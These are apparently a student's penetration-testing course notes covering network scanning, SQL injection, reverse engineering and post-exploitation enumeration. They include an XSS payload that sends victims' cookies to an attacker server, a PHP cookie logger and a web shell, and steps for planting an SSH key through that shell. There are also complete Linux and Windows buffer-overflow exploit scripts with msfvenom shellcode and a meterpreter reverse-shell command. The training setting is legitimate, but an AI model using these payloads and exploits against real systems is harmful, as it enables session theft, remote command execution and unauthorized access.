Website Scraper 

#!/usr/bin/python3

## IMPORTS ##
import lxml.html
import requests

## Grabs Webpage ##
page = requests.get('http://quotes.toscrape.com') (this is the website to change)
tree = lxml.html.fromstring(page.content)

## Outlines Tags You Want to Grab ##
# Change//small[..] to whatever tag you want. Leave /text() #
authors = tree.xpath('//small[@class="author"]/text()')

## Print (duh) ##
print ('Authors: ',authors)

Dont use Python3, use python2

frontend = the website you can access normally - backend = the server the website is stored on
can use 0.0.0.0 to reference yourself and any tunnels you have setup to websites

Example scan 
nmap -Pn -T4 10.50.37.95 -p 22,80,8080,8888,2222,4444
(use nmap only for single targets)

after getting ports banner grab using netcat
nc 10.50.37.95 22

Ping sweep example
for i in {1..254}; do (ping -c 1 192.168.1.$i | grep "bytes from" &); done 
(run this as close to the network you are trying to scan as possible, also dont scan the grey host network)

can use (previous nmap scan) --script banner.nse which automatically banner grabs ports that nmap finds
can use (previous nmap scan) --script http-enum.nse used for websites to enumerate well known paths
can use (previous nmap scan) --script smb-os-dicovery.nse (for windows machines)

nikto -host <ip address> (-port used if port is weird) can be used to get more website related information for an ip

========================================== COOKIE STEALING ===========================================
<script>document.location="http://your opstation ip:8000/"+document.cookie;</script>
run python3 -m http.server on your opstation before embedding the above code into the website to receive the cookie you just captured

cookie stealer file (CookieSteal.php)
<?php
$cookie = $_GET["username"]
$steal = fopen("/var/www/html/uploads/cookiefile.txt", "a+")
fwrite($steal, $cookie . "\n")
fclose($steal)
?>

(create a cookiefile.txt for the variable $steal)
upload these files and then use <script>document.location="http://<ServerIP>/uploads/cookiestealer.php?username="+document.cookie;</script> on the vulnerable website using XXS

webshell.php file
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<?php
if($_GET['cmd']) {
  system($_GET['cmd']);
}
?>
</pre>
</BODY></HTML>

to use this file also upload it to the vulnerable website to gain a basic shell on the box through the website
make sure to create an uploads directory in your lin ops for some reason

use the webshell to get cmd injection which means you can run any command using ; <cmd to run>
to gain access to the box using webshell: use whoami to see who you are then get your home directory
after finding your directory do ssh-keygen -t rsa -b 4096 and pay attention to where the keys are gonna be saved with no passphrase(just hit enter twice)
take the .ssh/id_rsa.pub and copy just the key into the previously discovered home folder for your account on the webshell
on this home folder ; mkdir <absolute path to home directory>/.ssh then echo "your copied public key" > <your home directory>/.ssh/authorized_keys
from here you should be able to ssh straight into the target from your box using ssh -i <where your private key is(ssh_rsa)> www-data@<target box>

for sql use show databases; to see all the different databases
use show tables from session; to see tables for a given session
select * from session.Tires; to get everything in the given table
select tireid,name,cost from session.Tires; to get specific info for the columns
use session; specifies a databse to step into which allows you to just specify the table you need

SQL BY THE NUMBERS
Browse website as normal & find input fields + variables
Test each field GET and/or POST (' OR 1='1)
find total # of columns (UNION 1,2,3....(test a lot to make sure you get the exact number of columns))
GOLDEN STATEMENT, UNION SELECT table_schema, table_name, column_name, (plus placeholders if needed)(can change order to fit funky tables) from information_schema.columns (find useful fields to use in your custom table statement)
Make new query based on custom tables+columns UNION SELECT <Values you found important> from CustomTable.CustomColumn;# 

*Get version information using @@version*

REVERSE ENGINEERING DEMO

IDA
Make sure to double check using ida and ghidra (but run it first)
make note of what it does when it runs to look for in ida
in Ida use view to search for strings view-open_subviews-strings
click on the string window to allow you to use CTRL+f to find your string then double-click on it to see where in the assembly code it is stored
we want success with the malware so we find success and double-click on the sub-whatver to go to it and begin reverse engineering through the code
red and green arrows mean what happens based on a compare statement and the JZ or JNZ
press h on hexadecimal text to convert it to decimal
move up line by line looking for the variable you found but stopping to check call functions and read their subkey
GENERALLY in IDA with ebp+<any variable> it is user input that is needed 

GHIDRA
create a new project to check new programs and then import said file to check it'
click yes on analyze file then just immediately hit analyze without changing anything
once again look for any strings you can remember by going to search and then for strings and changing the filter box
double click on what you found and then minimize the window you are on to begin reverse engineering
click on the FUN associated with the string you found after searching to get psudeocode
you can right click on hex to change it to decimal
can also right click on variables to rename them
param_1 is usually user input

============== EXPLOIT DEVELOPMENT ================

LINUX
Once you can run the executable run it and see what sort of input it takes (param or user input)
Add an excess of data to said executable and see if it gives a segmentation fault (core dumped) error

run gdp func and then pdisass main to view the assembly code and run it on every function ex. pdisass getuserinput and look for the vulnerable function

once you've found that it works get the executable back to your opstation so you can use gdb (type it into console and *should* get blood red prompt)
type gdb <executable> to load it in and type run to run the program and make sure it still breaks correctly (SIGSEV error)
The data you overflow the buffer with must end exactly at the EIP so code can be inserted (offset) which can be found on wiremask.eu and go to tools and Buffer Overflow Pattern Generator
once there copy the text in the box then run the executable again and feed it the pattern you copied (run it in gdb), once done the EIP option in the results will be the hexadecimal register value that you then enter in the registry value in wiremask
Create a python script as such with the offset you got:

(this is just a test script to make sure we have EIP) --------------------------------
#Declaring the offset as a variable
offset = 'A' * 62

#A check to make sure you actually have EIP (run in executable)
eip = 'B' * 4 (make sure you know how big the EIP is)

print(offset+eip)
----------------------------------------------------------------------------------------

then run this against executable using run <<< $(python /home/student/Downloads/BufferOverflow_Ex.py) (the triple carrot makes the command wait for user input such as running another command)
FOR TESTING FIND A VALID JUMP ESP ON YOUR BOX (proof of concept) AND ON THEIR BOX

now exit out of peda and run env - gdb to run normal gdb and run show env to see if you need to unset env LINES and unset env COLUMNS (make sure env empty)
use file <executable> if you forgot to include the file your breaking
once in normal gdb run and overflow the executable again to make sure it stil breaks
then run info proc map along with find /b <first address you see under the [heap] in info proc map(make sure you use start addr)>, <first address above the [stack] in info proc map (make sure you use last address)>, 0xff(jump assembly hex), 0xe4(ESP assembly registry)

use msfvenom -p linux/x86/exec CMD='/bin/whoami' -b "\x00" -f python to create your shellcode (CMD specifies a command to run) then copy all the buf and add it to your script

NOW UPDATED PYTHON SCRIPT -----------------------------------------------------------------------------------

#Declaring the offset as a variable
offset = 'A' * 62

#A check to make sure you actually have EIP (run in executable)
#eip = 'B' * 4

'''
6 random addresses found by info proc map + find /b
0xf7 f6 50 cf
0xf7f65343
0xf7f65497
0xf7f655cf
0xf7f65777
0xf7f659ef
0xf7f662eb
'''

#change from big to little endian
#take any address and space it into bytes and put it in backwards for eip 
eip = "\xcf\x50\xf6\xf7"

#make NOP sled for shellcode
nop = "\x90" * 10

buf =  b""
buf += b"\xdb\xc7\xb8\x34\x65\x03\xcb\xd9\x74\x24\xf4\x5b\x29"
buf += b"\xc9\xb1\x0c\x31\x43\x1a\x83\xeb\xfc\x03\x43\x16\xe2"
buf += b"\xc1\x0f\x08\x93\xb0\x82\x68\x4b\xef\x41\xfc\x6c\x87"
buf += b"\xaa\x8d\x1a\x57\xdd\x5e\xb9\x3e\x73\x28\xde\x92\x63"
buf += b"\x26\x21\x12\x74\x18\x43\x7b\x1a\x49\xf4\x13\x8d\xf4"
buf += b"\x97\x8a\x51\xa0\x34\xc5\xb3\x83\x3b"

print(offset+eip+nop+buf)
---------------------------------------------------------------------------------------

finally run ./func <<< $(python /home/student/Downloads/BufferOverflow_Ex.py)
can sudo previous command to prove privilege escalation is possible
look for gdb on a target box to know you need to use buffer overflow
run sudo -l to see what you can sudo

for troubleshooting you can double your nop sled (reset if still not working)
redo your shellcode to make sure it is correct (simplify your command just in case)
if still not working try a new ip for eip
if none of those work start from scratch

REMOTE BUFFER OVERFLOW (WINDOWS)

use a guide on internet
dont forget to run malware before testing script

example exploit script

#!/usr/bin/python

import socket
import os
import sys

host = "10.50.23.104"
port = 9999

# msfvenom -p windows/shell_bind_tcp EXITFUNC=thread -b "\x00" -f c
# Payload size: 355 bytes
shellcode = ("\xbd\xf4\xa8\x09\x42\xdb\xd3\xd9\x74\x24\xf4\x5b\x33\xc9\xb1"
"\x53\x83\xc3\x04\x31\x6b\x0e\x03\x9f\xa6\xeb\xb7\xa3\x5f\x69"
"\x37\x5b\xa0\x0e\xb1\xbe\x91\x0e\xa5\xcb\x82\xbe\xad\x99\x2e"
"\x34\xe3\x09\xa4\x38\x2c\x3e\x0d\xf6\x0a\x71\x8e\xab\x6f\x10"
"\x0c\xb6\xa3\xf2\x2d\x79\xb6\xf3\x6a\x64\x3b\xa1\x23\xe2\xee"
"\x55\x47\xbe\x32\xde\x1b\x2e\x33\x03\xeb\x51\x12\x92\x67\x08"
"\xb4\x15\xab\x20\xfd\x0d\xa8\x0d\xb7\xa6\x1a\xf9\x46\x6e\x53"
"\x02\xe4\x4f\x5b\xf1\xf4\x88\x5c\xea\x82\xe0\x9e\x97\x94\x37"
"\xdc\x43\x10\xa3\x46\x07\x82\x0f\x76\xc4\x55\xc4\x74\xa1\x12"
"\x82\x98\x34\xf6\xb9\xa5\xbd\xf9\x6d\x2c\x85\xdd\xa9\x74\x5d"
"\x7f\xe8\xd0\x30\x80\xea\xba\xed\x24\x61\x56\xf9\x54\x28\x3f"
"\xce\x54\xd2\xbf\x58\xee\xa1\x8d\xc7\x44\x2d\xbe\x80\x42\xaa"
"\xc1\xba\x33\x24\x3c\x45\x44\x6d\xfb\x11\x14\x05\x2a\x1a\xff"
"\xd5\xd3\xcf\x6a\xdd\x72\xa0\x88\x20\xc4\x10\x0d\x8a\xad\x7a"
"\x82\xf5\xce\x84\x48\x9e\x67\x79\x73\xb1\x2b\xf4\x95\xdb\xc3"
"\x50\x0d\x73\x26\x87\x86\xe4\x59\xed\xbe\x82\x12\xe7\x79\xad"
"\xa2\x2d\x2e\x39\x29\x22\xea\x58\x2e\x6f\x5a\x0d\xb9\xe5\x0b"
"\x7c\x5b\xf9\x01\x16\xf8\x68\xce\xe6\x77\x91\x59\xb1\xd0\x67"
"\x90\x57\xcd\xde\x0a\x45\x0c\x86\x75\xcd\xcb\x7b\x7b\xcc\x9e"
"\xc0\x5f\xde\x66\xc8\xdb\x8a\x36\x9f\xb5\x64\xf1\x49\x74\xde"
"\xab\x26\xde\xb6\x2a\x05\xe1\xc0\x32\x40\x97\x2c\x82\x3d\xee"
"\x53\x2b\xaa\xe6\x2c\x51\x4a\x08\xe7\xd1\x6a\xeb\x2d\x2c\x03"
"\xb2\xa4\x8d\x4e\x45\x13\xd1\x76\xc6\x91\xaa\x8c\xd6\xd0\xaf"
"\xc9\x50\x09\xc2\x42\x35\x2d\x71\x62\x1c")

buffer = "A"*2002
buffer += "\xa0\x12\x50\x62"        # 0x62 50 12 a0   JMP ESP from essfunc.dll
buffer += "\x90"*16                 # nopsled
buffer += shellcode
buffer += "C"*(5000-len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
print "[+] Sending exploit..."
s.send("TRUN /.:/ " + buffer)
print s.recv(1024)
s.close()

can use socket to execute on your Linux box 
Use Mona to get EIP overload address !mona jmp -r ESP -m “essfunc.dll”

use this msfvenom -p windows/meterpreter/reverse_tcp lhost=YOUR_IP_HERE lport=5555 b- “\x00” -f python to make a multihandler shell open on target
msfconsole then use multi/handler and set the payload to what you set on msfvenom (windows/meterpreter/reverse_tcp)

or use msfvenom -p windows/shell_bind_tcp EXITFUNC=thread -b "\x00" -f c and a nc -v <target> 4444 

=================================== POST EXPLOITATION ==================================

LINUX ENUMERATION
can run last to see users logged in now and in past, use who to see who's currently logged on, whoami to see who you are, groups to see what groups you have
can run id to see the uid and gid of the user who ran it
ps -elf or ps auxf or pstree for processes, sudo lsof for open files, ps -p 1 will show whether system is systemd or sysV
systemctl list-units --type service (can | grep for specific things) for systemd services, while SysV would be service --status-all
ifconfig -a will show ip addresses NICs and configuration, netstat shows open connections, arp -an shows stored mac addresses for ip addresses
ip route, route, or netstat -r shows the routing table
cat /proc/cpuinfo shows cpu info (no shot), lsmod list Kernel modules

WINDOWS ENUMERATION
net user or get-localuser shows users on box, get-localgroup shows groups (can use | get-member to see fields you can | select)
tasklist /v gives running processes or get-process (can pipe to | where { $_.sessionid -eq <number> } to find particular id
tasklist /svc shows services, net start shows started services, get-service | (optional arguments n' stuff) or wmic service list status
ipconfig /all shows NICS network configuration and other stuff, netstat -anob shows shows ports protocols binaries
net view and net use are used for workgroups shares and other such things
arp -a is the arp cache, route print shows the routing table, systeminfo gives os info and other things
date shows time and time config relative to that box


================================ SSH MULTIPLEXING ========================================

connection based on existence of a file
make directory in .ssh called cm (control masters) which will hold all connections
to setup a master connection with many coming off of it using ssh -M -S ~/.ssh/cm/grayBox student@10.50.39.214
now that the connection is established the file will exist as long as the connection does
to access your new connection do ssh -S ~/.ssh/cm/grayBox grayhost(name connection whatever in order to connect)
ssh -M -S ~/.ssh/cm/grayBox -o "ControlPersist=10m" student@10.50.39.214 with the -o means the connection will persist for xminutes even if closed
to build out further tunnels use ssh -O forward -L1111:10.100.28.48:80 -S ~/.ssh/cm/grayBox nla  where -O specifies that we are port forwarding through the gray host
to cancel connections ssh -O cancel -L2222:10.100.28.40:80 -S ~/.ssh/cm/grayBox nla where the -O is changed to cancel
ssh -O cancel ~/.ssh/cm/grayBox another the -O with cancel will attempt to gracefully teardown the master connection where -O exit will abruptly close it
can create more masters by using -M -S <specify a new folder> and -p if getting there through tunnel
scp -o "ControlPath=~/.ssh/cm/gray" placeholder:/home/student/func. can be used to run scp without even getting on the box
MAKE SURE TO HAVE A PLACEHOLDER FOR THE USUAL USERNAME@IP












